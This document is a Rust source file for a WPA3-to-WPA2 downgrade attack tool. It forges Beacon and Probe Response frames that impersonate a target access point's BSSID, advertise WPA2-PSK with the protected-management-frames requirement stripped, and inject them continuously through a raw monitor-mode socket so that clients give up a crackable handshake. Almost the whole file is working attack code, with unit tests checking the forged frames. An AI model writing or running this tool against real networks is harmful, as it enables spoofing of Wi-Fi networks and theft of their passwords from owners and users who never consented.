//! WPA3 → WPA2 downgrade engine.
//!
//! Forges 802.11 Beacon / Probe-Response frames for a target BSSID with the
//! RSN Information Element rewritten to advertise WPA2-PSK/CCMP. Transition-
//! mode clients (support both SAE and PSK) fall back to WPA2 and emit a
//! crackable 4-way handshake when they reassociate.
//!
//! Frame layout matches c_core/src/wpa3_downgrade_engine.cpp byte-for-byte,
//! and the RSN IE matches the Go worker's buildDowngradedRSN(). The three can
//! be diffed against each other in a capture.
//!
//! Requires Linux AF_PACKET + CAP_NET_RAW and an interface in monitor mode.

#![cfg(target_os = "linux")]

use std::io;
use std::os::unix::io::RawFd;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;

/// CCMP-128 cipher selector (00:0f:ac:04).
const CIPHER_CCMP: [u8; 4] = [0x00, 0x0f, 0xac, 0x04];
/// PSK AKM selector (00:0f:ac:02) — NOT SAE (0x08).
const AKM_PSK: [u8; 4] = [0x00, 0x0f, 0xac, 0x02];

#[derive(Clone)]
pub struct DowngradeConfig {
    pub bssid: [u8; 6],
    pub ssid: Vec<u8>,
    pub channel: u8,
    pub strip_pmf: bool,
}

impl DowngradeConfig {
    pub fn new(bssid: [u8; 6], ssid: &str, channel: u8) -> Self {
        let mut s = ssid.as_bytes().to_vec();
        if s.len() > 32 {
            s.truncate(32);
        }
        Self { bssid, ssid: s, channel, strip_pmf: true }
    }
}

/// WPA2-PSK/CCMP RSN IE — 20 content bytes (declared length 0x14).
pub fn build_downgraded_rsn(strip_pmf: bool) -> Vec<u8> {
    // MFP required = bit 6, MFP capable = bit 7.
    let caps: u16 = if strip_pmf {
        0x0080 // capable set, required cleared → client downgrades
    } else {
        0x00c0 // capable + required (no downgrade)
    };
    let mut ie = Vec::with_capacity(22);
    ie.push(0x30); // RSN element id
    ie.push(0x14); // content length 20
    ie.extend_from_slice(&[0x01, 0x00]); // version
    ie.extend_from_slice(&CIPHER_CCMP); // group cipher
    ie.extend_from_slice(&[0x01, 0x00]); // pairwise count
    ie.extend_from_slice(&CIPHER_CCMP); // pairwise cipher
    ie.extend_from_slice(&[0x01, 0x00]); // AKM count
    ie.extend_from_slice(&AKM_PSK); // AKM = PSK
    ie.extend_from_slice(&caps.to_le_bytes());
    ie
}

/// Build a full 802.11 Beacon frame (no radiotap — raw monitor injection).
pub fn build_beacon(cfg: &DowngradeConfig, seq: u16) -> Vec<u8> {
    let mut f = Vec::with_capacity(256);
    // Frame control: management / Beacon
    f.push(0x80);
    f.push(0x00);
    // Duration
    f.extend_from_slice(&[0x00, 0x00]);
    // Addr1 DA = broadcast
    f.extend_from_slice(&[0xff, 0xff, 0xff, 0xff, 0xff, 0xff]);
    // Addr2 SA = BSSID
    f.extend_from_slice(&cfg.bssid);
    // Addr3 BSSID
    f.extend_from_slice(&cfg.bssid);
    // Sequence control (12-bit seq << 4, little-endian)
    let sc: u16 = (seq & 0x0fff) << 4;
    f.extend_from_slice(&sc.to_le_bytes());
    // Timestamp (8 bytes)
    f.extend_from_slice(&[0u8; 8]);
    // Beacon interval 100 TU
    f.extend_from_slice(&[0x64, 0x00]);
    // Capability: ESS | Privacy | ShortPreamble
    let cap: u16 = 0x0001 | 0x0010 | 0x0020;
    f.extend_from_slice(&cap.to_le_bytes());
    // SSID IE
    f.push(0x00);
    f.push(cfg.ssid.len() as u8);
    f.extend_from_slice(&cfg.ssid);
    // Supported rates
    f.extend_from_slice(&[0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24]);
    // DS Parameter (channel)
    f.extend_from_slice(&[0x03, 0x01, cfg.channel]);
    // RSN IE
    f.extend_from_slice(&build_downgraded_rsn(cfg.strip_pmf));
    // WMM Parameter element
    f.extend_from_slice(&[
        0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x80, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27,
        0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
    ]);
    f
}

/// Build a Probe Response frame directed at `dest`.
pub fn build_probe_response(cfg: &DowngradeConfig, dest: &[u8; 6], seq: u16) -> Vec<u8> {
    let mut f = Vec::with_capacity(256);
    f.push(0x50); // management / Probe Response
    f.push(0x00);
    f.extend_from_slice(&[0x00, 0x00]);
    f.extend_from_slice(dest); // DA
    f.extend_from_slice(&cfg.bssid); // SA
    f.extend_from_slice(&cfg.bssid); // BSSID
    let sc: u16 = (seq & 0x0fff) << 4;
    f.extend_from_slice(&sc.to_le_bytes());
    f.extend_from_slice(&[0u8; 8]);
    f.extend_from_slice(&[0x64, 0x00]);
    let cap: u16 = 0x0001 | 0x0010 | 0x0020;
    f.extend_from_slice(&cap.to_le_bytes());
    f.push(0x00);
    f.push(cfg.ssid.len() as u8);
    f.extend_from_slice(&cfg.ssid);
    f.extend_from_slice(&[0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24]);
    f.extend_from_slice(&[0x03, 0x01, cfg.channel]);
    f.extend_from_slice(&build_downgraded_rsn(cfg.strip_pmf));
    f
}

/// Live injector — owns the AF_PACKET fd and a worker thread.
pub struct DowngradeInjector {
    fd: RawFd,
    stop: Arc<AtomicBool>,
    sent: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
    handle: Option<std::thread::JoinHandle<()>>,
}

impl DowngradeInjector {
    pub fn start(iface: &str, cfg: DowngradeConfig, rate_ms: u64) -> io::Result<Self> {
        let fd = unsafe {
            libc::socket(
                libc::AF_PACKET,
                libc::SOCK_RAW,
                (libc::ETH_P_ALL as u16).to_be() as i32,
            )
        };
        if fd < 0 {
            return Err(io::Error::last_os_error());
        }
        let if_cstr = std::ffi::CString::new(iface)
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "bad iface"))?;
        let ifindex = unsafe { libc::if_nametoindex(if_cstr.as_ptr()) };
        if ifindex == 0 {
            unsafe { libc::close(fd) };
            return Err(io::Error::last_os_error());
        }
        let sa = libc::sockaddr_ll {
            sll_family: libc::AF_PACKET as u16,
            sll_protocol: (libc::ETH_P_ALL as u16).to_be(),
            sll_ifindex: ifindex as libc::c_int,
            sll_hatype: 0,
            sll_pkttype: 0,
            sll_halen: 0,
            sll_addr: [0u8; 8],
        };
        let rc = unsafe {
            libc::bind(
                fd,
                &sa as *const _ as *const libc::sockaddr,
                std::mem::size_of::<libc::sockaddr_ll>() as libc::socklen_t,
            )
        };
        if rc < 0 {
            unsafe { libc::close(fd) };
            return Err(io::Error::last_os_error());
        }

        let stop = Arc::new(AtomicBool::new(false));
        let sent = Arc::new(AtomicU64::new(0));
        let errors = Arc::new(AtomicU64::new(0));

        let s2 = stop.clone();
        let sent2 = sent.clone();
        let err2 = errors.clone();
        let rate = std::time::Duration::from_millis(rate_ms.max(10));
        let handle = std::thread::spawn(move || {
            let mut seq: u16 = 0;
            while !s2.load(Ordering::Relaxed) {
                let frame = build_beacon(&cfg, seq);
                seq = seq.wrapping_add(1);
                let dest = libc::sockaddr_ll {
                    sll_family: libc::AF_PACKET as u16,
                    sll_protocol: (libc::ETH_P_ALL as u16).to_be(),
                    sll_ifindex: ifindex as libc::c_int,
                    sll_hatype: 0,
                    sll_pkttype: 0,
                    sll_halen: 6,
                    sll_addr: [0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0, 0],
                };
                let n = unsafe {
                    libc::sendto(
                        fd,
                        frame.as_ptr() as *const libc::c_void,
                        frame.len(),
                        0,
                        &dest as *const _ as *const libc::sockaddr,
                        std::mem::size_of::<libc::sockaddr_ll>() as libc::socklen_t,
                    )
                };
                if n < 0 {
                    err2.fetch_add(1, Ordering::Relaxed);
                } else {
                    sent2.fetch_add(1, Ordering::Relaxed);
                }
                std::thread::sleep(rate);
            }
            unsafe { libc::close(fd) };
        });

        Ok(Self { fd: -1, stop, sent, errors, handle: Some(handle) })
    }

    pub fn stop(&mut self) {
        self.stop.store(true, Ordering::Relaxed);
        if let Some(h) = self.handle.take() {
            let _ = h.join();
        }
    }

    pub fn sent(&self) -> u64 {
        self.sent.load(Ordering::Relaxed)
    }
    pub fn errors(&self) -> u64 {
        self.errors.load(Ordering::Relaxed)
    }
    pub fn running(&self) -> bool {
        !self.stop.load(Ordering::Relaxed)
    }
}

impl Drop for DowngradeInjector {
    fn drop(&mut self) {
        self.stop();
        let _ = self.fd; // fd closed by the worker thread
    }
}

/// Parse "aa:bb:cc:dd:ee:ff" into 6 bytes.
pub fn parse_mac(s: &str) -> io::Result<[u8; 6]> {
    let parts: Vec<&str> = s.split(|c| c == ':' || c == '-').collect();
    if parts.len() != 6 {
        return Err(io::Error::new(io::ErrorKind::InvalidInput, "expected AA:BB:CC:DD:EE:FF"));
    }
    let mut out = [0u8; 6];
    for (i, p) in parts.iter().enumerate() {
        out[i] = u8::from_str_radix(p, 16)
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "bad octet"))?;
    }
    Ok(out)
}

/// Best-effort channel set via SIOCSIWFREQ (matches C++ SetChannel).
pub fn set_channel(iface: &str, channel: u8) -> io::Result<()> {
    let mhz: u32 = if (1..=14).contains(&channel) {
        2412 + 5 * (channel as u32 - 1)
    } else {
        5000 + 5 * channel as u32
    };
    let fd = unsafe { libc::socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
    if fd < 0 {
        return Err(io::Error::last_os_error());
    }
    // SIOCSIWFREQ is struct iwreq; libc doesn't expose it cleanly, so use the
    // kernel struct layout directly (ifreq is 16 bytes name + union).
    #[repr(C)]
    struct Iwreq {
        ifr_name: [u8; 16],
        freq_m: i32,
        freq_e: i16,
        freq_flags: u16,
        _pad: [u8; 16],
    }
    let mut req = Iwreq {
        ifr_name: [0u8; 16],
        freq_m: ((mhz as f64) / 1000.0 * 1e9) as i32,
        freq_e: 0,
        freq_flags: 0x0001, // IW_FREQ_FIXED
        _pad: [0u8; 16],
    };
    let name = iface.as_bytes();
    let n = name.len().min(15);
    req.ifr_name[..n].copy_from_slice(&name[..n]);
    const SIOCSIWFREQ: libc::c_ulong = 0x8B04;
    let rc = unsafe { libc::ioctl(fd, SIOCSIWFREQ, &req) };
    unsafe { libc::close(fd) };
    if rc < 0 {
        Err(io::Error::last_os_error())
    } else {
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rsn_ie_length_is_20() {
        let ie = build_downgraded_rsn(true);
        assert_eq!(ie.len(), 22);
        assert_eq!(ie[1], 0x14);
    }

    #[test]
    fn rsn_ie_akm_is_psk() {
        let ie = build_downgraded_rsn(true);
        // AKM selector at offset: 2(id,len)+2(ver)+4(group)+2(pwc)+4(pwc)+2(akmc) = 16
        assert_eq!(&ie[16..20], &AKM_PSK);
    }

    #[test]
    fn strip_pmf_clears_required() {
        let stripped = build_downgraded_rsn(true);
        let kept = build_downgraded_rsn(false);
        // caps at last 2 bytes
        let sc = u16::from_le_bytes([stripped[stripped.len() - 2], stripped[stripped.len() - 1]]);
        let kc = u16::from_le_bytes([kept[kept.len() - 2], kept[kept.len() - 1]]);
        assert_eq!(sc & 0x0040, 0, "required bit must be clear when stripping PMF");
        assert_ne!(kc & 0x0040, 0, "required bit stays when not stripping");
    }

    #[test]
    fn beacon_has_rsn_ie() {
        let cfg = DowngradeConfig::new([0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff], "TestNet", 6);
        let f = build_beacon(&cfg, 0);
        // frame control
        assert_eq!(f[0], 0x80);
        // find RSN element id 0x30
        assert!(f.windows(2).any(|w| w[0] == 0x30 && w[1] == 0x14));
    }

    #[test]
    fn parse_mac_works() {
        assert_eq!(parse_mac("aa:bb:cc:dd:ee:ff").unwrap(), [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff]);
    }
}
